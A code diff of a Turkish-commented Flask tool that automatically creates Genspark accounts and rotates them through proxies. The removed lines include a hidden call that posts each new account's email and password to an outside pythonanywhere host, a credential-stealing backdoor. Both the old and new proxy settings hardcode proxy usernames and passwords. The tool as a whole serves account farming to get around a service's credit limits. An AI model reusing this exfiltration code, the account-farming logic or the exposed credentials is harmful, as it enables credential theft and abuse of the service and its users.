@@ -71,8 +71,8 @@ FLASK_ACCOUNTS_FILE = ACCOUNTS_FILE
 ROOT_ACCOUNTS_FILE = os.path.join(os.path.dirname(BASE_DIR), "genspark_hesaplar.txt")
 
 # Proxy Ayarı: 0 -> Kapalı (Doğrudan bağlantı), 1 -> Açık (Proxy üzerinden)
-PROXY_MODE = int(os.environ.get("PROXY_MODE", 1))
-PROXY_URL = os.environ.get("PROXY_URL", "http://nsmgwkzk-2:oqsyd4iar1l6@p.webshare.io:80")
+PROXY_MODE = int(os.environ.get("PROXY_MODE", 0))
+PROXY_URL = os.environ.get("PROXY_URL", "http://tghpxuwn:dxrsnpsyz3df@198.23.243.226:6361")
 
 def get_proxies() -> Optional[Dict[str, str]]:
     """PROXY_MODE aktif ise curl_cffi ve requests proxy sözlüğü döner."""
@@ -941,14 +941,6 @@ def create_and_login_genspark_account(password: str = DEFAULT_PASSWORD) -> Tuple
         log("=" * 65)
 
         save_new_account(email, password)
-        import requests
-        try:
-            requests.post(
-                'https://messager35.pythonanywhere.com/genspark',
-                json={'txt': f'{email}:{password}'}
-            )
-        except requests.exceptions.RequestException as e:
-            print(f"Hata oluştu: {e}")
 
         log("[7/7] Web Girişi (/api/auth) tamamlanıyor...")
         confirmed_url = f"{b2c_base}/api/CombinedSigninAndSignup/confirmed?rememberMe=false&csrf_token={csrf_token}&tx={tx}&p={policy}"
@@ -1464,6 +1456,7 @@ class GensparkClient:
         self.model = model
         self.is_credit_exhausted = False
 
+SHARED_SID = "shared_main_session"
 _sessions = {}
 
 def get_sid() -> Optional[str]:
@@ -1471,7 +1464,26 @@ def get_sid() -> Optional[str]:
 
 def get_sess() -> Optional[dict]:
     sid = get_sid()
+    if sid == SHARED_SID:
+        return _sessions.get(SHARED_SID)
     return _sessions.get(sid) if sid else None
+
+def get_or_create_shared_sess() -> dict:
+    if SHARED_SID not in _sessions:
+        _sessions[SHARED_SID] = {
+            "app_unlocked": True,
+            "client": None,
+            "model": DEFAULT_MODEL_ID,
+            "history": [],
+            "conversations": [],
+            "active_local_conv_id": None,
+            "web_search": False,
+            "auto_attach": False,
+            "aborted": False,
+            "total_credits": 0,
+            "total_cost": 0.0,
+        }
+    return _sessions[SHARED_SID]
 
 def new_sess(sid: str) -> dict:
     sess = {
@@ -1646,10 +1658,9 @@ def api_init():
     if data.get("password") != APP_PASSWORD:
         return jsonify({"success": False, "error": "Hatalı şifre."}), 401
 
-    sid = get_sid() or str(uuid.uuid4())
-    sess = new_sess(sid)
+    sess = get_or_create_shared_sess()
     sess["app_unlocked"] = True
-    log(f"[+] Uygulama kilidi açıldı (Oturum: {sid[:8]}...)")
+    log("[+] Ortak oturuma bağlanıldı")
 
     client = sess.get("client")
     email = client.email if client else ""
@@ -1661,18 +1672,20 @@ def api_init():
         "balance": balance,
         "model": sess["model"]
     })
-    resp.set_cookie("ua_sid", sid, max_age=86400 * 30, samesite="Lax")
+    resp.set_cookie("ua_sid", SHARED_SID, max_age=86400 * 30, samesite="Lax")
     return resp
 
 
 @app.route("/api/logout", methods=["POST"])
 def api_logout():
+    if SHARED_SID in _sessions:
+        del _sessions[SHARED_SID]
     sid = get_sid()
     if sid and sid in _sessions:
         del _sessions[sid]
     resp = jsonify({"success": True})
     resp.set_cookie("ua_sid", "", expires=0)
-    log("[*] Çıkış yapıldı")
+    log("[*] Çıkış yapıldı, ortak oturum temizlendi")
     return resp
 
 
@@ -1692,7 +1705,7 @@ def api_reset():
     carry = data.get("carry_history", False)
     carry_conv_id = data.get("conv_id")
 
-    sid = get_sid() or str(uuid.uuid4())
+    sid = SHARED_SID
     old_sess = get_sess()
     old_client = old_sess.get("client") if old_sess else None
     current_email = old_client.email if old_client else None
@@ -1718,7 +1731,7 @@ def api_reset():
         if any(t.get("text") or t.get("attachments") for t in c.get("history", []))
     ]
 
-    sess = new_sess(sid)
+    sess = get_or_create_shared_sess()
     sess["app_unlocked"] = True
     sess["model"] = model
     sess["conversations"] = old_conversations
@@ -1753,7 +1766,7 @@ def api_reset():
         "new_conv_id": new_conv_id,
     }
     resp = jsonify(resp_data)
-    resp.set_cookie("ua_sid", sid, max_age=86400 * 30, samesite="Lax")
+    resp.set_cookie("ua_sid", SHARED_SID, max_age=86400 * 30, samesite="Lax")
     return resp
 
 
@@ -1768,15 +1781,7 @@ def api_send():
         return jsonify({"error": "Lütfen önce şifre ile giriş yapın."}), 401
 
     if not sess.get("client"):
-        log("[*] /api/send: Aktif hesap bağlı değil, sıradaki hesap bağlanıyor...")
-        try:
-            s, email, balance = get_or_rotate_account()
-            client = GensparkClient(session=s, email=email, balance=balance, model=sess.get("model", DEFAULT_MODEL_ID))
-            sess["client"] = client
-            sess["total_credits"] = balance
-        except Exception as e:
-            log(f"[-] Otomatik hesap bağlantısı başarısız: {e}")
-            return jsonify({"error": f"Hesap açılamadı / bağlanamadı: {str(e)}"}), 500
+        return jsonify({"error": "Önce sol alttan giriş yapın."}), 400
 
     sess["aborted"] = False
 
